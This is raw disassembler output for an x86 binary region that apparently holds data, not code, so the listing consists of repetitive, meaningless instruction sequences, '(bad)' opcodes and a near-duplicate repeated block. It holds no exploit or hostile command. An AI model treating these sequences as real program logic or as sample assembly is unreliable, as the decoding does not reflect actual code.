  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    ah,dl
  412425:	cmp    al,BYTE PTR [ebx]
  412427:	add    ah,dl
  412429:	sub    al,BYTE PTR [ebx]
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
